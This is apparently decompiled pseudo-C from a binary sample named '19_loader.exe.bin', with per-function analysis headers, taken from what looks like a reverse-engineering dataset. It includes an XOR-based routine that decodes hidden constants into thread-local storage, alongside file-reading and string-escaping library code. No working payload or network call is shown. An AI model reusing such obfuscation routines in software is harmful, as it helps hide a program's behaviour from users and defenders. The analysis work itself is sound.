        lVar24 = lVar16 + 1;
        uVar14 = (uint)*(byte *)((longlong)&local_180 + (ulonglong)*pbVar25) | uVar14 << 5;
        uVar21 = uVar10 + 5;
        if (2 < uVar10) {
          bVar23 = (byte)(uVar10 - 3);
          if (uVar28 == local_1b0) {
            FUN_1400012c4(&local_1b8);
            local_190 = local_1b8;
          }
          local_190[uVar28] = (byte)(uVar14 >> (bVar23 & 0x1f));
          uVar28 = uVar28 + 1;
          uVar14 = uVar14 & ~(-1 << (bVar23 & 0x1f));
          uVar21 = uVar10 - 3;
          local_1a8 = uVar28;
        }
      } while( true );
    }
  }
LAB_1400117e8:
                    /* WARNING: Does not return */
  pcVar5 = (code *)invalidInstructionException();
  (*pcVar5)();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x11d10 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140011d10 rva=0x11d10 */

void FUN_140011d10(void)

{
  char cVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  longlong lVar5;
  
  if (*(char *)(*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) +
               0x5e) == '\0') {
    lVar2 = -0x5dd27a8207e1005f;
    uVar3 = 0;
    lVar5 = 0;
    do {
      *(longlong *)
       (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 8 + lVar5)
           = *(longlong *)((longlong)&DAT_1400887a8 + lVar5) + lVar2;
      uVar3 = uVar3 + 1;
      lVar5 = lVar5 + 8;
      lVar2 = lVar2 + 0x22a90c33c6082123;
    } while (uVar3 < 6);
    uVar3 = 0x4763c573;
    uVar4 = 0;
    lVar2 = 0;
    do {
      *(uint *)(*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) +
                0x40 + lVar2) = *(uint *)((longlong)&DAT_140088a0c + lVar2) ^ uVar3;
      uVar4 = uVar4 + 1;
      uVar3 = uVar3 + 0x703f492d;
      lVar2 = lVar2 + 4;
    } while (uVar4 < 5);
    lVar2 = *(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
    *(undefined2 *)(lVar2 + 0x54) = 0x2ef8;
    *(undefined2 *)(lVar2 + 0x56) = 0xe60c;
    cVar1 = -0x10;
    lVar2 = 0;
    do {
      *(char *)(*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) +
                0x58 + lVar2) = (&DAT_140089f19)[lVar2] + cVar1;
      cVar1 = cVar1 + -0x75;
      lVar2 = lVar2 + 1;
    } while ((uint)lVar2 < 6);
    *(undefined1 *)
     (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x5e) = 1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x11e86 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140011e86 rva=0x11e86 */

ulonglong FUN_140011e86(uint param_1)

{
  longlong lVar1;
  ulonglong uVar2;
  longlong lVar3;
  uint uVar4;
  uint uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  
  uVar6 = 0x3c;
  lVar1 = 0;
  do {
    uVar2 = uVar6 >> 1;
    uVar6 = uVar6 - uVar2;
    lVar3 = uVar2 + lVar1;
    if (param_1 < ((&DAT_14008891c)[lVar3] & 0x1fffff)) {
      lVar3 = lVar1;
    }
    lVar1 = lVar3;
  } while (1 < uVar6);
  uVar2 = (ulonglong)((&DAT_14008891c)[lVar3] * 0x800 == param_1 * 0x800) + lVar3 +
          (ulonglong)((uint)((&DAT_14008891c)[lVar3] * 0x800) < param_1 * 0x800);
  uVar6 = (ulonglong)((uint)(&DAT_14008891c)[uVar2] >> 0x15);
  uVar7 = 0x5b5;
  if ((uVar2 < 0x3b) &&
     (uVar7 = (ulonglong)(*(uint *)(&DAT_140088920 + uVar2 * 4) >> 0x15), uVar2 == 0)) {
    uVar4 = 0;
  }
  else {
    uVar4 = *(uint *)(&DAT_140088918 + uVar2 * 4) & 0x1fffff;
  }
  if (~uVar6 + uVar7 != 0) {
    uVar5 = 0;
    do {
      uVar5 = (byte)(&DAT_1400897d1)[uVar6] + uVar5;
      if (param_1 - uVar4 < uVar5) break;
      uVar6 = uVar6 + 1;
    } while (uVar7 - 1 != uVar6);
  }
  return uVar6 & 0xffffffffffffff01;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x11f41 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140011f41 rva=0x11f41 */

void FUN_140011f41(HANDLE param_1,undefined8 param_2,ulonglong param_3)

{
  code *pcVar1;
  uint uVar2;
  undefined8 local_18;
  undefined8 uStack_10;
  
  local_18 = 0x103;
  uStack_10 = 0;
  if (0xfffffffe < param_3) {
    param_3 = 0xffffffff;
  }
  uVar2 = NtWriteFile(param_1,0,0,0,&local_18,param_2,(int)param_3,0,0);
  if (uVar2 == 0x103) {
    WaitForSingleObject(param_1,0xffffffff);
    uVar2 = (uint)local_18;
    if ((uint)local_18 == 0x103) {
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(7);
                    /* WARNING: Does not return */
      pcVar1 = (code *)invalidInstructionException();
      (*pcVar1)();
    }
  }
  FUN_14000246e(uVar2);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x11fe8 | partial_markers_remain ===== */
/* address=140011fe8 rva=0x11fe8 */

undefined8 FUN_140011fe8(undefined8 param_1,longlong param_2,int param_3,longlong param_4)

{
  undefined8 uVar1;
  
  if (param_3 != -1) {
    uVar1 = (**(code **)(param_2 + 0x20))(param_1,param_3);
    if ((char)uVar1 != '\0') {
      return CONCAT71((int7)((ulonglong)uVar1 >> 8),1);
    }
  }
  if (param_4 == 0) {
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x00014001202b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar1 = (**(code **)(param_2 + 0x18))(param_1,param_4,0);
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x12039 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140012039 rva=0x12039 */

void FUN_140012039(undefined8 param_1,ulonglong param_2,ushort *param_3)

{
  FUN_140010a2f(param_1,0x140088890,param_2,param_3);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x12055 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

void FUN_140012055(LPVOID param_1)

{
  HANDLE hHeap;
  
  (**(code **)((longlong)param_1 + 0x20))
            (*(undefined8 *)((longlong)param_1 + 0x10),*(undefined8 *)((longlong)param_1 + 0x18));
  hHeap = GetProcessHeap();
  HeapFree(hHeap,0,param_1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x12082 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140012082 rva=0x12082 */

void FUN_140012082(LPVOID param_1,undefined8 *param_2)

{
  if ((code *)*param_2 != (code *)0x0) {
    (*(code *)*param_2)(param_1);
  }
  if (param_2[1] == 0) {
    return;
  }
  FUN_14000260b(param_1,param_2[2]);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x120bc | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400120bc rva=0x120bc */

void FUN_1400120bc(undefined8 *param_1,byte *param_2,HANDLE param_3)

{
  code *pcVar1;
  bool bVar2;
  char cVar3;
  char cVar4;
  BOOL BVar5;
  DWORD DVar6;
  ulonglong uVar7;
  longlong lVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  undefined8 unaff_RBP;
  undefined8 uVar11;
  ulonglong uVar12;
  ulonglong uVar13;
  LPVOID *ppvVar14;
  LPVOID *ppvVar15;
  LPVOID *ppvVar16;
  uint uVar17;
  LPVOID local_b8;
  ulonglong uStack_b0;
  ulonglong local_a8;
  undefined8 local_a0;
  undefined8 *local_98;
  LPVOID *local_90;
  ulonglong local_88;
  ulonglong local_80;
  _BY_HANDLE_FILE_INFORMATION local_78;
  
  local_78.dwFileAttributes._0_1_ = 0;
  local_78.dwFileAttributes._1_1_ = 0;
  local_78.ftCreationTime.dwLowDateTime = 0;
  local_78.ftCreationTime.dwHighDateTime = 0;
  local_78._16_5_ = 7;
  local_78._24_8_ = local_78._24_8_ & 0xffff000000000000;
  local_78._32_8_ = local_78._32_8_ & 0xff00000000000000;
  local_78.dwFileAttributes._2_1_ = 1;
  uVar7 = FUN_140010cb1(param_2,(longlong)param_3,(byte *)&local_78);
  if ((uVar7 & 1) != 0) {
    *param_1 = param_3;
    param_1[1] = 0xffffffffffffffff;
    return;
  }
  local_78.nFileSizeHigh = 0;
  local_78.nFileSizeLow = 0;
  local_78.nNumberOfLinks = 0;
  local_78.nFileIndexHigh = 0;
  local_78.ftLastAccessTime.dwHighDateTime = 0;
  local_78.ftLastWriteTime.dwLowDateTime = 0;
  local_78.ftLastWriteTime.dwHighDateTime = 0;
  local_78.dwVolumeSerialNumber = 0;
  local_78.dwFileAttributes._0_1_ = '\0';
  local_78.dwFileAttributes._1_1_ = 0;
  local_78.dwFileAttributes._2_1_ = 0;
  local_78.dwFileAttributes._3_1_ = 0;
  local_78.ftCreationTime.dwLowDateTime = 0;
  local_78.ftCreationTime.dwHighDateTime = 0;
  local_78.ftLastAccessTime.dwLowDateTime = 0;
  local_78.nFileIndexLow = 0;
  BVar5 = GetFileInformationByHandle(param_3,&local_78);
  if (BVar5 == 0) {
LAB_14001221f:
    DVar6 = GetLastError();
    if ((undefined **)PTR_PTR_1400dfa90 != &PTR_LAB_1400886d0) {
      PTR_PTR_1400dfa90 = (undefined *)&PTR_LAB_1400886d0;
    }
    uVar7 = (ulonglong)DVar6 << 0x20 | 2;
    bVar2 = false;
    uVar9 = 0;
  }
  else {
    if ((local_78.dwFileAttributes._1_1_ & 4) != 0) {
      local_b8 = (LPVOID)0x0;
      BVar5 = GetFileInformationByHandleEx(param_3,FileAttributeTagInfo,&local_b8,8);
      if (BVar5 == 0) goto LAB_14001221f;
    }
    uVar9 = CONCAT44(local_78.nFileSizeHigh,local_78.nFileSizeLow);
    bVar2 = true;
    uVar7 = uVar9;
  }
  FUN_140002164((undefined8 *)&local_78,uVar9,0,1,1);
  uVar9 = local_78._16_8_;
  if ((char)local_78.dwFileAttributes != '\0') {
    *param_1 = 0x2600000003;
    param_1[1] = 0xffffffffffffffff;
    goto LAB_140012179;
  }
  local_b8 = (LPVOID)CONCAT44(local_78.ftLastAccessTime.dwLowDateTime,
                              local_78.ftCreationTime.dwHighDateTime);
  uStack_b0._0_4_ = local_78.ftLastAccessTime.dwHighDateTime;
  uStack_b0._4_4_ = local_78.ftLastWriteTime.dwLowDateTime;
  local_a8 = 0;
  if ((bool)(bVar2 & uVar7 < 0xfffffffffffffc00)) {
    ppvVar16 = (LPVOID *)(uVar7 + 0x400);
    ppvVar15 = (LPVOID *)(((ulonglong)ppvVar16 & 0xffffffffffffe000) + 0x2000);
    if (ppvVar15 < ppvVar16) {
      ppvVar15 = (LPVOID *)0x2000;
    }
    if (((ulonglong)ppvVar16 & 0x1fff) == 0) {
      ppvVar15 = ppvVar16;
    }
LAB_1400122e4:
    uVar11 = 0;
    if (uVar7 != 0) {
      local_a0 = 0;
      uVar11 = local_a0;
      goto LAB_140012349;
    }
  }
  else {
    ppvVar15 = (LPVOID *)0x2000;
    uVar11 = CONCAT71((int7)((ulonglong)unaff_RBP >> 8),1);
    if (bVar2) goto LAB_1400122e4;
  }
  if ((ulonglong)local_78._16_8_ < 0x20) {
    ppvVar16 = &local_b8;
    uVar7 = FUN_14000ffb7(param_3,(longlong *)ppvVar16);
    if ((uVar7 & 1) == 0) {
      local_a0 = uVar11;
      if (ppvVar16 != (LPVOID *)0x0) goto LAB_140012349;
LAB_1400124d1:
      param_1[2] = local_a8;
      *param_1 = local_b8;
      param_1[1] = uStack_b0;
    }
    else {
LAB_140012151:
      *param_1 = ppvVar16;
      param_1[1] = 0xffffffffffffffff;
      FUN_140001280(local_b8,uStack_b0,1,1);
    }
LAB_140012179:
    CloseHandle(param_3);
    return;
  }
LAB_140012349:
  local_a0 = uVar11;
  uVar7 = 0;
  uVar12 = uStack_b0;
LAB_14001234b:
  uVar10 = uVar12 - local_a8;
  while (uVar13 = uVar7, uVar10 < 0x20) {
    if (uVar12 != uVar9) {
      if (uVar12 - local_a8 < 0x20) {
        lVar8 = FUN_140013790(&local_b8,local_a8,0x20,(LPVOID)0x1,1);
        if (lVar8 != -1) {
          ppvVar16 = (LPVOID *)0x2600000003;
          goto LAB_140012151;
        }
        uVar12 = uStack_b0;
      }
      uVar13 = local_a8;
      break;
    }
    ppvVar16 = &local_b8;
    uVar7 = FUN_14000ffb7(param_3,(longlong *)ppvVar16);
    if ((uVar7 & 1) != 0) goto LAB_140012151;
    if (ppvVar16 == (LPVOID *)0x0) goto LAB_1400124d1;
    uVar7 = local_a8;
    uVar12 = uStack_b0;
    uVar10 = uStack_b0 - local_a8;
  }
  uVar10 = local_a8;
  local_98 = param_1;
  local_90 = ppvVar15;
  local_80 = uVar9;
  if (local_a8 + 0x20 < uVar13) {
    ppvVar14 = (LPVOID *)(uVar13 - local_a8);
    if ((LPVOID *)(uVar12 - local_a8) < (LPVOID *)(uVar13 - local_a8)) {
                    /* WARNING: Does not return */
      pcVar1 = (code *)invalidInstructionException();
      (*pcVar1)();
    }
  }
  else {
    ppvVar14 = (LPVOID *)(uVar12 - local_a8);
    if (ppvVar15 < (LPVOID *)(uVar12 - local_a8)) {
      ppvVar14 = ppvVar15;
    }
  }
  local_88 = (longlong)ppvVar14 + local_a8;
  ppvVar15 = (LPVOID *)((longlong)local_b8 + local_a8);
LAB_14001243d:
  ppvVar16 = ppvVar15;
  uVar7 = FUN_140010243(param_3,ppvVar15,(ulonglong)ppvVar14);
  if ((uVar7 & 1) == 0) goto LAB_140012469;
  uVar17 = (uint)ppvVar16 & 3;
  cVar3 = (char)((ulonglong)ppvVar16 >> 0x20);
  switch(uVar17) {
  case 0:
    cVar4 = *(char *)(ppvVar16 + 2);
    break;
  case 1:
    cVar4 = *(char *)((longlong)ppvVar16 + -1);
    break;
  case 2:
    cVar4 = (**(code **)PTR_PTR_1400dfa90)((ulonglong)ppvVar16 >> 0x20);
    break;
  case 3:
    cVar4 = cVar3;
  }
  param_1 = local_98;
  if (cVar4 == '\v') {
    if ((1 < uVar17 - 2) && (((ulonglong)ppvVar16 & 3) != 0)) {
      (**(code **)((longlong)ppvVar16 + 7))((longlong)ppvVar16 + -1);
    }
    local_a8 = uVar10;
    goto LAB_1400124d1;
  }
  if (ppvVar16 == (LPVOID *)0x0) {
    local_a8 = uVar10;
    goto LAB_1400124d1;
  }
  switch(uVar17) {
  case 0:
    if (*(char *)(ppvVar16 + 2) != '#') break;
    goto LAB_14001243d;
  case 1:
    if (*(char *)((longlong)ppvVar16 + -1) == '#') {
      (**(code **)((longlong)ppvVar16 + 7))((longlong)ppvVar16 + -1);
      goto LAB_14001243d;
    }
    break;
  case 2:
    cVar3 = (**(code **)(PTR_PTR_1400dfa90 + 8))((ulonglong)ppvVar16 >> 0x20);
    if (cVar3 != '\0') goto LAB_14001243d;
    break;
  case 3:
    goto switchD_140012555_caseD_3;
  }
  goto LAB_140012147;
LAB_140012469:
  uVar7 = local_88;
  if (uVar13 < local_88) {
    uVar7 = uVar13;
  }
  local_a8 = uVar10 + (longlong)ppvVar16;
  param_1 = local_98;
  if (ppvVar16 == (LPVOID *)0x0) goto LAB_1400124d1;
  uVar9 = local_80;
  ppvVar15 = local_90;
  if (((byte)local_a0 & local_88 <= uVar13) == 0) {
    if ((byte)local_a0 != 0) {
      ppvVar15 = (LPVOID *)0xffffffffffffffff;
    }
  }
  else if (ppvVar16 == local_90) {
    ppvVar15 = (LPVOID *)((longlong)local_90 * 2);
    if ((longlong)local_90 < 0) {
      ppvVar15 = (LPVOID *)0xffffffffffffffff;
    }
  }
  goto LAB_14001234b;
switchD_140012555_caseD_3:
  if ((LPVOID *)0x2bffffffff < ppvVar16) {
    cVar3 = -1;
  }
  if (cVar3 == '#') goto LAB_14001243d;
LAB_140012147:
  param_1 = local_98;
  local_a8 = uVar10;
  goto LAB_140012151;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x125b9 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400125b9 rva=0x125b9 */

void FUN_1400125b9(undefined8 *param_1,ulonglong param_2)

{
  code *pcVar1;
  longlong lVar2;
  
  if ((ulonglong)(param_1[1] - param_1[2]) < param_2) {
    lVar2 = FUN_140013790(param_1,param_1[2],param_2,(LPVOID)0x1,1);
    if (lVar2 != -1) {
                    /* WARNING: Does not return */
      pcVar1 = (code *)invalidInstructionException();
      (*pcVar1)();
    }
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x125f1 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

undefined8 FUN_1400125f1(longlong param_1,ulonglong param_2)

{
  undefined4 *puVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong in_R8;
  uint uVar4;
  char cVar5;
  ulonglong uVar6;
  
  uVar4 = (uint)*(undefined8 *)
                 (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) +
                 0x60) ^ 0xe2539b10;
  puVar1 = &UNK_14008b2e0;
  if (param_2 == uVar4) {
    puVar1 = &UNK_14008b2e4;
  }
  uVar3 = 0;
                    /* WARNING: Switch is manually overridden */
  switch(*puVar1) {
  case 0xa0:
override_jmp_14001264e_case_1:
    return 0;
  }
  do {
    while( true ) {
      uVar2 = (param_2 - uVar3 >> 1) + uVar3;
      uVar6 = (ulonglong)
              *(uint *)(param_1 +
                       ((((uint)*(undefined8 *)
                                 (*(longlong *)
                                   ((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8)
                                 + 0xf0) ^ 0xb200) - uVar4) + 0x43ca & 0xffff) * uVar2);
      cVar5 = (in_R8 < uVar6) - (uVar6 < in_R8);
      if (cVar5 != '\x01') break;
      puVar1 = &UNK_14008b2e0;
      if (uVar2 <= uVar3) {
        puVar1 = &UNK_14008b2e4;
      }
      param_2 = uVar2;
                    /* WARNING: Switch is manually overridden */
      switch(*puVar1) {
      case 0xa0:
        goto override_jmp_14001264e_case_1;
      }
    }
    if (cVar5 != -1) {
      return 1;
    }
    uVar3 = uVar2 + 1;
    puVar1 = &UNK_14008b2e4;
    if (uVar3 < param_2) {
      puVar1 = &UNK_14008b2e0;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar1) {
    case 0xa0:
      goto override_jmp_14001264e_case_1;
    }
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x126ff | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400126ff rva=0x126ff */

ulonglong FUN_1400126ff(uint param_1)

{
  undefined8 in_RAX;
  undefined7 uVar2;
  ulonglong uVar1;
  
  uVar2 = (undefined7)((ulonglong)in_RAX >> 8);
  uVar1 = CONCAT71(uVar2,1);
  if (0x377 < param_1) {
    if (param_1 < 0x3fffe) {
      uVar1 = FUN_140011e86(param_1);
      uVar1 = uVar1 ^ 1;
    }
    else if ((param_1 != 0xe0001 && 0xfffd < param_1 - 0xf0000) &&
             (0x5f < param_1 - 0xe0020 && 0xef < param_1 - 0xe0100)) {
      uVar1 = CONCAT71(uVar2,param_1 - 0x100000 < 0xfffe);
    }
  }
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1277b | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001277b rva=0x1277b */

ulonglong FUN_14001277b(longlong *param_1,longlong param_2)

{
  ulonglong uVar1;
  undefined4 uVar2;
  bool bVar3;
  char cVar4;
  byte bVar5;
  uint uVar6;
  uint uVar7;
  ulonglong uVar8;
  undefined8 unaff_RBX;
  ulonglong uVar9;
  longlong lVar10;
  ulonglong uVar11;
  ulonglong uVar12;
  undefined8 uVar13;
  longlong lVar14;
  code *pcVar15;
  longlong lVar16;
  ulonglong uVar17;
  ulonglong uVar18;
  longlong lVar19;
  undefined2 uStack_84;
  undefined2 local_82;
  undefined1 uStack_80;
  undefined1 uStack_7f;
  undefined1 uStack_7e;
  undefined1 uStack_7d;
  undefined1 uStack_7c;
  undefined1 uStack_7b;
  undefined2 local_7a;
  undefined2 local_78;
  undefined2 uStack_76;
  undefined4 uStack_74;
  undefined2 uStack_70;
  char local_6c;
  char local_6b;
  longlong local_68;
  undefined8 local_60;
  code *local_58;
  longlong local_50;
  longlong local_48;
  
  local_68 = *param_1;
  uVar1 = param_1[2];
  uVar13 = *(undefined8 *)(param_2 + 0x10);
  lVar14 = *(longlong *)(param_2 + 0x18);
  pcVar15 = *(code **)(lVar14 + 0x20);
  cVar4 = (*pcVar15)(uVar13,0x22);
  uVar9 = CONCAT71((int7)((ulonglong)unaff_RBX >> 8),1);
  if (cVar4 == '\0') {
    lVar16 = local_68;
    local_50 = lVar14;
    if (uVar1 == 0) {
      uVar17 = 0;
      uVar18 = 0;
    }
    else {
      uVar18 = 0;
      uVar17 = 0;
      uVar11 = uVar1;
      lVar14 = local_68;
      local_60 = uVar13;
      local_58 = pcVar15;
      do {
        lVar10 = lVar14 + uVar11;
        uVar12 = 0;
        while (((cVar4 = *(char *)(lVar14 + uVar12), 0xa0 < (byte)(cVar4 + 0x81U) && (cVar4 != '\"')
                ) && (cVar4 != '\\'))) {
          uVar12 = uVar12 + 1;
          if (uVar11 == uVar12) {
            uVar18 = uVar18 + uVar11;
            goto LAB_14001296d;
          }
        }
        bVar5 = *(byte *)(lVar14 + uVar12);
        uVar6 = (uint)bVar5;
        if ((char)bVar5 < '\0') {
          lVar19 = lVar14 + uVar12;
          uVar7 = *(byte *)(lVar19 + 1) & 0x3f;
          if (bVar5 < 0xe0) {
            lVar14 = lVar19 + 2;
            uVar6 = (uVar6 & 0x1f) << 6 | uVar7;
          }
          else {
            uVar7 = *(byte *)(lVar19 + 2) & 0x3f | uVar7 << 6;
            if (bVar5 < 0xf0) {
              lVar14 = lVar19 + 3;
              uVar6 = uVar7 | (uVar6 & 0x1f) << 0xc;
            }
            else {
              lVar14 = lVar19 + 4;
              uVar6 = (uVar6 & 7) << 0x12 | uVar7 << 6 | *(byte *)(lVar19 + 3) & 0x3f;
            }
          }
        }
        else {
          lVar14 = lVar14 + uVar12 + 1;
        }
        if (uVar6 < 0xd) {
          if (uVar6 == 0) {
            local_78 = 0x305c;
          }
          else if (uVar6 == 9) {
            local_78 = 0x745c;
          }
          else {
            if (uVar6 != 10) goto LAB_140012a3f;
            local_78 = 0x6e5c;
          }
LAB_140012bed:
          uStack_76 = 0;
          uStack_74 = 0;
          uStack_70 = 0;
          uVar11 = 0;
          bVar3 = true;
          uVar9 = CONCAT71((int7)(uVar9 >> 8),2);
        }
        else {
          if (uVar6 < 0x27) {
            if (uVar6 == 0xd) {
              local_78 = 0x725c;
            }
            else {
              if (uVar6 != 0x22) goto LAB_140012a3f;
              local_78 = 0x225c;
            }
            goto LAB_140012bed;
          }
          if (uVar6 == 0x27) {
LAB_140012a60:
            local_78 = (undefined2)uVar6;
            uStack_76 = (undefined2)(uVar6 >> 0x10);
            uVar11 = 0x80;
            bVar3 = false;
            uVar9 = CONCAT71((int7)(uVar9 >> 8),0x81);
          }
          else {
            if (uVar6 == 0x5c) {
              local_78 = 0x5c5c;
              goto LAB_140012bed;
            }
LAB_140012a3f:
            if (uVar6 - 0x20 < 0x5f || (uVar6 & 0xfffffffe) == 0xff9e) goto LAB_140012a60;
            if (0x1f < uVar6 && 0x20 < uVar6 - 0x7f) {
              if (0xfffd < uVar6 - 0x100000 && (0x18ff < uVar6 - 0xe000 && 0xfffd < uVar6 - 0xf0000)
                 ) {
                if (4 < uVar6 - 9) {
                  if (uVar6 != 0x20) {
                    if (uVar6 < 0x85) {
LAB_140012a83:
                      uVar11 = FUN_1400126ff(uVar6);
                      lVar16 = local_68;
                      uVar9 = uVar1;
                      if ((char)uVar11 != '\0') goto LAB_140012a60;
                    }
                    else {
                      uVar7 = uVar6 >> 8;
                      if (uVar7 < 0x20) {
                        if (uVar7 == 0) {
                          bVar5 = (&DAT_1400896d1)[uVar6 & 0xff];
                        }
                        else {
                          if (uVar7 != 0x16) goto LAB_140012af4;
                          bVar5 = uVar6 == 0x1680;
                        }
LAB_140012aec:
                        if ((bVar5 & 1) != 0) goto LAB_1400128a8;
                      }
                      else {
                        if (uVar7 == 0x20) {
                          bVar5 = (byte)(&DAT_1400896d1)[uVar6 & 0xff] >> 1;
                          goto LAB_140012aec;
                        }
                        if (uVar7 == 0x30) {
                          bVar5 = uVar6 == 0x3000;
                          goto LAB_140012aec;
                        }
                      }
LAB_140012af4:
                      if (uVar6 < 0x300) {
                        if (uVar6 < 0xad) goto LAB_140012a83;
                      }
                      else {
                        uVar11 = FUN_140002384(uVar6);
                        lVar16 = local_68;
                        uVar9 = uVar1;
                        if ((char)uVar11 != '\0') goto LAB_1400128a8;
                      }
                      uVar11 = FUN_1400136d4(uVar6);
                      lVar16 = local_68;
                      uVar9 = uVar1;
                      if ((char)uVar11 == '\0') {
                        uVar11 = FUN_140008d54(uVar6);
                        lVar16 = local_68;
                        if ((char)uVar11 == '\0') goto LAB_140012a83;
                      }
                    }
                  }
                }
              }
            }
LAB_1400128a8:
            uVar7 = 0x1f;
            if ((uVar6 | 1) != 0) {
              for (; (uVar6 | 1) >> uVar7 == 0; uVar7 = uVar7 - 1) {
              }
            }
            uVar8 = (ulonglong)((uVar7 ^ 0x1c) >> 2);
            uVar11 = uVar8 - 2;
            uStack_80 = 0;
            local_82 = 0;
            uStack_7f = (&DAT_14008a054)[uVar6 >> 0x14];
            uStack_7e = (&DAT_14008a054)[uVar6 >> 0x10 & 0xf];
            uStack_7d = (&DAT_14008a054)[uVar6 >> 0xc & 0xf];
            uStack_7c = (&DAT_14008a054)[uVar6 >> 8 & 0xf];
            uStack_7b = (&DAT_14008a054)[uVar6 >> 4 & 0xf];
            local_7a = CONCAT11(0x7d,(&DAT_14008a054)[uVar6 & 0xf]);
            *(undefined2 *)((longlong)&uStack_84 + uVar8) = 0x755c;
            *(undefined1 *)((longlong)&local_82 + uVar8) = 0x7b;
            uVar2 = CONCAT13(uStack_7f,CONCAT12(uStack_80,local_82));
            local_78 = local_82;
            uStack_76 = (undefined2)((uint)uVar2 >> 0x10);
            uStack_74 = (undefined4)
                        (CONCAT17(uStack_7b,
                                  CONCAT16(uStack_7c,CONCAT15(uStack_7d,CONCAT14(uStack_7e,uVar2))))
                        >> 0x20);
            uStack_70 = local_7a;
            bVar3 = true;
            uVar9 = CONCAT71((int7)(uVar9 >> 8),10);
          }
        }
        uVar12 = uVar12 + uVar18;
        local_6c = (char)uVar9;
        local_6b = (char)uVar11;
        if ((char)(local_6c - local_6b) != '\x01') {
          local_48 = lVar10;
          if (((uVar12 < uVar17) || (uVar1 < uVar12)) ||
             ((uVar17 != uVar1 &&
              (((uVar17 != 0 && (*(char *)(lVar16 + uVar17) < -0x40)) ||
               ((uVar12 != uVar1 && (*(char *)(lVar16 + uVar12) < -0x40)))))))) goto LAB_1400129a7;
          pcVar15 = *(code **)(local_50 + 0x18);
          cVar4 = (*pcVar15)(local_60,uVar17 + lVar16,uVar12 - uVar17);
          if (cVar4 == '\0') {
            if (bVar3) {
              cVar4 = (*pcVar15)(local_60,(longlong)&local_78 + (uVar11 & 0xff),
                                 (uVar9 & 0xff) - (uVar11 & 0xff));
            }
            else {
              cVar4 = (*local_58)(local_60,CONCAT22(uStack_76,local_78));
            }
            if (cVar4 == '\0') {
              lVar16 = 1;
              if ((0x7f < uVar6) && (lVar16 = 2, 0x7ff < uVar6)) {
                lVar16 = 4 - (ulonglong)(uVar6 < 0x10000);
              }
              uVar17 = lVar16 + uVar12;
              lVar16 = local_68;
              lVar10 = local_48;
              goto LAB_140012cd5;
            }
          }
          uVar9 = CONCAT71((int7)(uVar9 >> 8),1);
          goto LAB_1400129d4;
        }
LAB_140012cd5:
        lVar19 = 1;
        if ((0x7f < uVar6) && (lVar19 = 2, 0x7ff < uVar6)) {
          lVar19 = 4 - (ulonglong)(uVar6 < 0x10000);
        }
        uVar18 = lVar19 + uVar12;
        uVar11 = lVar10 - lVar14;
      } while (uVar11 != 0);
LAB_14001296d:
      uVar9 = CONCAT71((int7)(uVar9 >> 8),1);
      if ((uVar18 < uVar17) || (uVar1 < uVar18)) {
LAB_1400129a7:
                    /* WARNING: Does not return */
        pcVar15 = (code *)invalidInstructionException();
        (*pcVar15)();
      }
      uVar13 = local_60;
      pcVar15 = local_58;
      if (uVar17 == uVar1) {
        uVar17 = uVar1;
      }
      else {
        if ((uVar17 != 0) && (*(char *)(lVar16 + uVar17) < -0x40)) goto LAB_1400129a7;
        if (uVar18 == uVar1) {
          uVar18 = uVar1;
        }
        else if (*(char *)(lVar16 + uVar18) < -0x40) goto LAB_1400129a7;
      }
    }
    cVar4 = (**(code **)(local_50 + 0x18))(uVar13,lVar16 + uVar17,uVar18 - uVar17);
    if (cVar4 == '\0') {
      uVar6 = (*pcVar15)(uVar13,0x22);
      uVar9 = (ulonglong)uVar6;
    }
  }
LAB_1400129d4:
  return uVar9 & 0xffffffff;
}



